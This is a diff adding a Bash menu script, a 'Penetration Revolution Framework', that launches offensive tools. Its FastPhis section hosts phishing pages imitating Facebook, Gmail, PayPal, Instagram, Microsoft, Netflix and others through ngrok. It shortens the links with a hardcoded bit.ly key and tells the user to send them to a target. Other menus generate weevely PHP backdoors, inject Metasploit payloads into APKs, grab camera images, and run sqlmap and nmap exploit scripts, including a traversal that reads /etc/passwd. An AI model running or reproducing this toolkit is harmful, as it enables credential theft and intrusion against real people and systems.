@@ -1,0 +1,657 @@
+#!/bin/bash
+#rUn=$(zenity --question --title="Penetration Revolution Framework" --text "Run Script Penetration Revolution Framework ?" --width 300
+
+clear
+blue='\e[0;34'
+cyan='\e[1;96m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[033;91m'
+yellow='\e[033;93m'
+
+PS3="Penetration Revolution]>"
+check() {
+  echo -e "$green[+]$white Checking backend applications .."${Reset};
+  echo -e "$green[+]$white Please Wait...."${Reset};
+  sleep 5
+# check Metasploit
+c=`which msfconsole`
+if [ "$?" != "0" ]; then
+  FaIl="YES"
+  echo -e "$red[+]$white metasploit '->' not found!${Reset}";
+  sleep 1
+  echo -e "$red[x]$white This script requires Metasploit to work"${Reset};
+  echo -e "$red[☆]$white Please wait: installing missing dependencies .."${Reset};
+  echo ""
+  sudo apt-get install metasploit-framework
+  echo ""
+else
+  echo -e "$green[+]$white Metasploit-Framework    : $okegreen found!"${Reset};
+  sleep 1
+fi
+
+# check Curl
+curl=`which curl`
+if [ "$?" != "0" ]; then
+  FaIl="YES"
+  echo -e "$red[+]$white Curl '->' not found!${Reset}";
+  sleep 1
+  echo -e "$red[x]$white This script requires Curl to work"${Reset};
+  echo -e "$red[☆]$white Please wait: installing missing dependencies .."${Reset};
+  echo ""
+  sudo apt-get install curl
+  echo ""
+else
+  echo -e "$green[+]$white Curl    : $okegreen found!"${Reset};
+  sleep 1
+fi
+
+# check php
+php=`which php`
+if [ "$?" != "0" ]; then
+  FaIl="YES"
+  echo -e " $red[x]$white php  '->' not found!"${Reset};
+  sleep 1
+  echo -e "$red[x]$white This script requires php to work"${Reset};
+  echo -e "$yellow [☆] Please wait: installing missing dependencies .."${Reset};
+  echo ""
+  sudo apt-get install php
+  echo ""
+else
+  echo -e "$green[+]$white php script    : $okegreen found!"${Reset};
+  sleep 1
+fi
+
+# check python
+python=`which python`
+if [ "$?" != "0" ]; then
+  FaIl="YES"
+  echo -e "$red[+]$white python '->' not found!${Reset}";
+  sleep 1
+  echo -e "$red[x]$white This script requires python to work"${Reset};
+  echo -e "$red[☆]$white Please wait: installing missing dependencies .."${Reset};
+  echo ""
+  sudo apt-get install python2 python
+  echo ""
+else
+  echo -e "$green[+]$white python    : $okegreen found!"${Reset};
+  sleep 1
+fi
+
+
+# check nmap
+nmap=`which nmap`
+if [ "$?" != "0" ]; then
+  FaIl="YES"
+  echo -e "$red[+]$white nmap '->' not found!${Reset}";
+  sleep 1
+  echo -e "$red[x]$white This script requires nmap to work"${Reset};
+  echo -e "$red[☆]$white Please wait: installing missing dependencies .."${Reset};
+  echo ""
+  sudo apt-get install nmap
+  echo ""
+else
+  echo -e "$green[+]$white Nmap    : $okegreen found!"${Reset};
+  sleep 1
+fi
+}
+stop(){
+  pkill -f -2 ssh > /dev/null 2>&1
+  killall ssh > /dev/null 2>&1
+  pkill -f -2 php > /dev/null 2>&1
+  killall php > /dev/null 2>&1
+  rm -rf server
+}
+stop
+check
+
+
+echo -e   """$cyan
+
+<============================================================>
+||  ____                  __             __  _              ||
+||  / __ \___  ____  ___  / /__________ _/ /_(_)___  ____   ||
+||  / /_/ / _ \/ __ \/ _ \/ __/ ___/ __  / __/ / __ \/ __ \ ||
+||  / ____/  __/ / / /  __/ /_/ /  / /_/ / /_/ / /_/ / / / /||
+||  /_/    \\\\/_/ /_/\___/\__/_/__ \__,_\\__\_/\______ /_/ /_/ ||
+||  / __ \___ _   ______  / /_  __/ /_(_)___  ____          ||
+||  / /_/ / _ \ | / / __ \/ / / / / __/ / __ \/ __ \        ||
+||  / _, _/  __/ |/ / /_/ / / /_/ / /_/ / /_/ / / / /       ||
+||  /_/ |_|\___/|___/\____/_/\__,_/\__/_/\____/_/ /_/       ||
+======>=====>=====>=====>=====>=====>=====>=====>=====>======>
+|| Info : Penetration Revolution V1.0 ||
+|| Site : https://www.mrcakil.tech    ||
+|| github: https://github.com/mrcakil ||
+|| Contact: mrcakil@programmer.net    ||
+|| Copyright@2018 By Mr.cakil         ||
+<=================><=================>                  
+"""
+echo -e "$yellow"
+mainmenu=("add kali linux repositories & Update" "kali linux tools" "Metasploit Pack" "GrabCamera" "getprox (Get Proxy List)" "sqlmap" "Admin Finder" "Nmap" "svscanner" "weevely" "Injecting Payloads to APK (Metasploit)" "Os Linux Desktop" "FastPhis") 
+select opt in "${mainmenu[@]}"
+do
+  case $opt in
+    "add kali linux repositories & Update")
+main=("linux" "termux")
+select ok in "${main[@]}"
+do
+  case $ok in
+    "linux")
+apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6
+echo "# Kali linux repositories | Added by Mr.cakil\ndeb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list | apt update
+;;
+
+"termux")
+apt-key adv --keyserver pgp.mit.edu --recv-keys ED444FF07D8D0BF6
+echo "# Kali linux repositories | Added by Mr.cakil\ndeb http://http.kali.org/kali kali-rolling main contrib non-free" >> /data/data/com.termux/files/usr/etc/apt/sources.list | apt update
+;;
+
+*) echo invalid option
+esac
+done
+;;
+
+"kali linux tools")
+python2 modules/kali/tool.py
+;;
+
+"Injecting Payloads to APK (Metasploit)")
+bash modules/inject.sh
+;;
+
+"GrabCamera")
+bash modules/grabcam/camera.sh
+;;
+
+"getprox (Get Proxy List)")
+echo "Options : "
+echo "Type : http, https, socks4, socks5"
+echo "anon : transparent, anonymous, elite"
+echo "Country : ID, US, AU, etc"
+read -p "Masukan Type >> " type;
+read -p "Masukan Anon >> " anon;
+read -p "Masukan Country >> " country;
+echo "================================"
+echo "       Powered By Mrcakil       "
+echo "================================"
+echo "Result : "
+curl -s "https://www.proxy-list.download/api/v1/get?type=$type&anon=$anon&country=$country"
+curl -s "https://www.proxy-list.download/api/v1/get?type=$type&anon=$anon&country=$country" -o list.txt
+echo "Saved : list.txt"
+;;
+
+"Metasploit Pack")
+bash modules/Metasploit/payload
+;;
+
+"FastPhis")
+akun="o_1o6ig4t6q1"
+key="R_e656535d4eff4c39bb0f099192742e80"
+phising=("Facebook Auto Like" "Facebook" "Gmail" "Paypal" "PUBG" "instagram" "twitter" "microsoft" "Netflix")
+select fastphis in "${phising[@]}"
+do
+  case $fastphis in
+    "Facebook Auto Like")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/fbLike> /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"Facebook")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/facebook > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"instagram")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/instagram > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"twitter")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/twitter > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"microsoft")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/microsoft > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"Netflix")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/netflix > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"Gmail")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/gmail > /dev/null 2>&1 & 
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"Paypal")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/paypal > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+sleep 2
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+"PUBG")
+echo -e "$red[+]$lighgreen Starting php Server"
+php -S 127.0.0.1:80 -t modules/FastPhising/PUBG > /dev/null 2>&1 &
+sleep 5
+echo -e "$red[+]$lightgreen Starting Ngrok Server "
+ngrok start -all > /dev/null 2>&1 &
+sleep 4
+hosthttp=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+echo "$hosthttp" > http
+sleep 10
+echo -e "$red[*]$lightgreen Send Link To Target :  $yellow https://$hosthttp"
+send_ip=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=https://$hosthttp&format=txt" 2> /dev/null)
+echo -e "$red[*]$lightgreen Or Shortlink:$yellow" $send_ip
+;;
+
+*) echo invalid option
+esac
+done
+;;
+
+"sqlmap")
+sql=("GET Request" "POST Request" "Scanning POST Login Pages" "CRAWL" "SQLMap Through Proxy" "Database Enumeration" )
+select kontol in "${sql[@]}"
+do
+ case $kontol in
+   "GET Request")
+read -p "masukan url : " url;
+read -p "masukan parameter : " met;
+python2 modules/sqlmap/sqlmap.py -u $url -p $met
+;;
+"POST Request")
+read -p "masukan url : " url;
+python2 modules/sqlmap/sqlmap.py -u $url –data="user=admin&password=admin"
+;;
+"Scanning POST Login Pages")
+read -p "masukan url : " url;
+read -p "masukan cookie : " cok;
+python2 modules/sqlmap/sqlmap.py -u $url –cookie="$cok"
+;;
+"CRAWL")
+read -p "masukan url : " url;
+read -p "jumlah crawl : " crawl;
+python2 modules/sqlmap/sqlmap.py -u $url –crawl=$crawl
+;;
+"SQLMap Through Proxy")
+read -p "masukan url : " url;
+read -p "masukan parameter : " met;
+read -p "masukan proxy : " rox;
+python2 modules/sqlmap/sqlmap.py -u $url -p $met –proxy="$rox"
+;;
+"Database Enumeration")
+read -p "masukan url : " url;
+python2 modules/sqlmap/sqlmap.py -u $url --dbs
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Admin Finder")
+php modules/admin_finder/adfin.php
+;;
+
+"Os Linux Desktop")
+bash modules/desktop/desktop.sh
+;;
+
+"svscanner")
+php modules/svscanner/svscanner.php
+;;
+
+"weevely")
+main=("Start ssh-like terminal session" "Restore a saved session file"
+  "Generate PHP backdoor" "Show available module and backdoor generators" )
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Start ssh-like terminal session")
+read -p "masukan url : " url;
+read -p "masukan password : " pass;
+python2 modules/Weevely/weevely.py $url $pass
+;;
+"Restore a saved session file")
+read -p "masukan session path file : " file;
+python2 modules/Weevely/weevely.py session $file
+;;
+"Generate PHP backdoor")
+read -p "masukan password : " pass;
+read -p "masukan Path file : " path;
+python2 modules/Weevely/weevely.py generate $pass $path
+;;
+"Show available module and backdoor generators")
+python2 modules/Weevely/weevely.py --help
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Nmap")
+main=("Nmap Target Selection" "Nmap Port Selection" "Nmap Port Scan types" 
+  "Service and OS Detection" "Digging deeper with NSE Scripts" "HTTP Service Information" "Detect Heartbleed SSL Vulnerability" "Exploit Scanner")
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Nmap Target Selection")
+nmap=("Scan a single IP" "Scan a host" "Scan a range of IPs" "Scan a subnet" "Scan targets from a text file")
+select cakil in "${nmap[@]}"
+do
+  case $cakil in
+    "Scan a single IP")
+read -p "masukan ip : " ip;
+nmap $ip
+;;
+"Scan a host")
+read -p "masukan host : " host;
+nmap $host
+;;
+"Scan a range of IPs")
+read -p "masukan ip : " ip;
+nmap $host-20
+;;
+"Scan a subnet")
+read -p "masukan ip : " ip;
+nmap $ip/24
+;;
+"Scan targets from a text file")
+read -p "masukan list target : " list;
+nmap -iL $list
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Nmap Port Selection")
+main=("Scan a single Port" "Scan a range of ports" "Scan 100 most common ports (Fast)" "Scan all 65535 ports" )
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Scan a single Port")
+read -p "masukan ip : " ip;
+read -p "masukan port : " port;
+nmap -p $port $ip
+;;
+"Scan a range of ports")
+read -p "masukan ip : " ip;
+nmap -p 1-100 $ip
+;;
+"Scan 100 most common ports (Fast)")
+read -p "masukan ip : " ip;
+nmap -F $ip
+;;
+"Scan all 65535 ports")
+read -p "masukan ip : " ip;
+nmap -p- $ip
+;;
+*) echo invalid option
+esac
+done
+;;
+"Nmap Port Scan types")
+main=("Scan using TCP connect" "Scan using TCP SYN scan (default)" "Scan selected ports - ignore discovery")
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Scan using TCP connect")
+read -p "masukan ip : " ip;
+nmap -sT $ip
+;;
+
+"Scan using TCP SYN scan (default)")
+read -p "masukan ip :" ip;
+nmap -sS $ip
+;;
+"Scan selected ports - ignore discovery")
+read -p "masukan ip : " ip;
+nmap -Pn -F $ip
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Service and OS Detection")
+main=("Detect OS and Services" "Standard service detection" "More aggressive Service Detection" "Lighter banner grabbing detection")
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Detect OS and Services")
+read -p "masukan ip : " ip;
+nmap -A $ip
+;;
+"Standard service detection")
+read -p "masukan ip : " ip;
+nmap -sV $ip
+;;
+"More aggressive Service Detection")
+read -p "masukan ip : " ip;
+nmap -sV --version-intensity 5 $ip
+;;
+"Lighter banner grabbing detection")
+read -p "masukan ip : " ip;
+nmap -sV --version-intensity 0 $ip
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Digging deeper with NSE Scripts")
+main=("Scan using default safe scripts" "Get help for a script" "Scan using a specific NSE script" "Scan with a set of scripts" )
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Scan using default safe scripts")
+read -p "masukan ip : " ip;
+nmap -sV -sC $ip
+;;
+"Get help for a script")
+nmap --script-help=ssl-heartbleed
+;;
+"Scan using a specific NSE script")
+read -p "masukan ip : " ip;
+nmap -sV -p 443 –script=ssl-heartbleed.nse $ip
+;;
+"Scan with a set of scripts")
+read -p "masukan ip : " ip;
+nmap -sV --script=smb* $ip
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"HTTP Service Information")
+main=("Gather page titles from HTTP services" "Get HTTP headers of web services" "Find web apps from known paths")
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Gather page titles from HTTP services")
+read -p "masukan ip : " ip;
+nmap --script=http-title $ip/24
+;;
+"Get HTTP headers of web services")
+read -p "masukan ip : " ip;
+nmap --script=http-headers $ip/24
+;;
+"Find web apps from known paths")
+read -p "masukan ip : " ip;
+nmap --script=http-enum $ip/24
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Detect Heartbleed SSL Vulnerability")
+main=("Heartbleed Testing")
+select cakil in "${main[@]}"
+do
+  case $cakil in
+    "Heartbleed Testing")
+read -p "masukan ip : " ip;
+nmap -sV -p 443 --script=ssl-heartbleed $ip/24
+;;
+*) echo invalid option
+esac
+done
+;;
+
+"Exploit Scanner")
+exploit=("fileupload exploiter" "dombased xss" "http csrf" "shellshock" "stored xss" "jdwp inject" "phpmyadmin-dir-traversal" "http-dlink-backdoor" "ftp-vsftpd-backdoor" "ftp-proftpd-backdoor" "sql injection vuln" "joomla bruteforce")
+select cakil in "${exploit[@]}"
+do
+  case $cakil in
+    "fileupload exploiter")
+read -p "masukan targets or ip : " targets;
+nmap -p80 --script http-fileupload-exploiter.nse $targets
+;;
+"dombased xss")
+read -p "masukan targets or ip : " targets;
+nmap -p80 --script http-dombased-xss.nse $targets
+;;
+"http csrf")
+read -p "masukan targets or ip : " targets;
+nmap -p80 --script http-csrf.nse $targets
+;;
+"shellshock")
+read -p "masukan targets or ip : " targets;
+nmap -sV -p- --script http-shellshock $targets
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls $targets
+;;
+"stored xss")
+read -p "masukan targets or ip : " targets;
+nmap -p80 --script http-stored-xss.nse $targets
+;;
+"jdwp inject")
+read -p "masukan targets or ip : " targets;
+read -p "masukan port : " port;
+nmap -sT $targets -p $port --script=+jdwp-inject --script-args filename=HelloWorld.class
+;;
+"phpmyadmin-dir-traversal")
+read -p "masukan targets or ip : " targets;
+nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" $targets
+nmap -p80 --script http-phpmyadmin-dir-traversal $targets
+;;
+"http-dlink-backdoor")
+read -p "masukan targets or ip : " targets;
+nmap -sV --script http-dlink-backdoor $targets
+;;
+"ftp-vsftpd-backdoor")
+read -p "masukan targets or ip : " targets;
+nmap --script ftp-vsftpd-backdoor -p 21 $targets
+;;
+"ftp-proftpd-backdoor")
+read -p "masukan targets or ip : " targets;
+nmap --script ftp-proftpd-backdoor -p 21 $targets
+;;
+"sql injection vuln")
+read -p "masukan targets or ip : " targets;
+nmap -sV --script=http-sql-injection $targets
+;;
+"joomla bruteforce")
+read -p "masukan targets or ip : " targets;
+nmap -sV --script http-joomla-brute $targets
+;;
+*) echo invalid option
+esac
+done
+;;
+*) echo invalid option
+esac
+done
+;;
+*) echo invalid option
+esac
+done
+
+
+
